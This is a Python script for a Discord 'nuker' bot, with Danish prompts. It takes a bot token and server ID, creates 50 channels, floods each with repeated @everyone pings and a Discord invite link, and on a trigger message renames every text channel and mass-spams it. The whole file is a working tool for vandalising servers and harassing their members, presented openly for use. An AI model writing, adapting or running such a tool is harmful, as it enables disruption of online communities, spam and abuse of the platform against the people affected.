import discord
import asyncio
from colorama import Fore, Style, init

# Initialiser colorama
init()

def print_ascii_art():
    ascii_art = f"""
{Fore.RED}  ____   ____ _______   _   _ _    _ _  ________ _____  
 |  _ \ / __ \__   __| | \ | | |  | | |/ /  ____|  __ \ 
 | |_) | |  | | | |    |  \| | |  | | ' /| |__  | |__) |
 |  _ <| |  | | | |    | . ` | |  | |  < |  __| |  _  / 
 | |_) | |__| | | |    | |\  | |__| | . \| |____| | \ \ 
 |____/ \____/  |_|    |_| \_|\____/|_|\_\______|_|  \_\
                                                                                                                                                                                           
{Style.RESET_ALL}
    """
    print(ascii_art)

class Nuker(discord.Client):
    def __init__(self, token, server_id):
        self.token = token
        self.server_id = int(server_id)
        intents = discord.Intents.default()
        intents.guilds = True
        intents.guild_messages = True
        intents.message_content = True
        super().__init__(intents=intents)

    async def on_ready(self):
        print(f"{Fore.RED}Logged in as {self.user.name}{Style.RESET_ALL}")
        guild = discord.utils.get(self.guilds, id=self.server_id)
        if guild:
            tasks = []
            for i in range(50):  # Create 50 new channels
                channel_name = f"😈Huskatten Nuker {i+1}😈"
                tasks.append(guild.create_text_channel(name=channel_name))

            channels = await asyncio.gather(*tasks)
            print(f"{Fore.RED}Created 50 new channels!{Style.RESET_ALL}")

            # Now, spam messages in the new channels
            for channel in channels:
                if isinstance(channel, discord.TextChannel):
                    tasks = []
                    for _ in range(50):  # Spam 50 messages in each channel
                        tasks.append(channel.send("@everyone"))
                        tasks.append(channel.send("😈Hvis du vil nuke sådan her join https://discord.gg/dY43dJNKFy"))

                    await asyncio.gather(*tasks)
                    print(f"{Fore.RED}Spammed channel: {channel.name}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Serveren blev ikke fundet!{Style.RESET_ALL}")

    async def on_message(self, message):
        if message.author == self.user:
            return

        if message.content == "Indtast bottents token":
            await message.channel.send(f"{Fore.RED}Skriv Bottens Token{Style.RESET_ALL}")

        if message.content.startswith("Skriv Serveren ID "):
            server_id = message.content.split(" ")[1]
            if int(server_id) == self.server_id:
                guild = discord.utils.get(self.guilds, id=self.server_id)
                if guild:
                    for channel in guild.channels:
                        if isinstance(channel, discord.TextChannel):
                            await channel.edit(name="😈Huskatten Nuker😈")

                            for _ in range(50):
                                await channel.send("@everyone")
                                await channel.send("😈Hvis du vil nuke sådan her join https://discord.gg/dY43dJNKFy")
                else:
                    await message.channel.send(f"{Fore.RED}Serveren blev ikke fundet!{Style.RESET_ALL}")
            else:
                await message.channel.send(f"{Fore.RED}Server-ID stemmer ikke overens!{Style.RESET_ALL}")

if __name__ == "__main__":
    # Print ASCII-tegning ved scriptstart
    print_ascii_art()

    # Spørg brugeren om token og server ID
    token = input(f"{Fore.RED}Skriv Bottens Token: {Style.RESET_ALL}")
    server_id = input(f"{Fore.RED}Skriv Serveren ID: {Style.RESET_ALL}")
    client = Nuker(token, server_id)
    client.run(token)
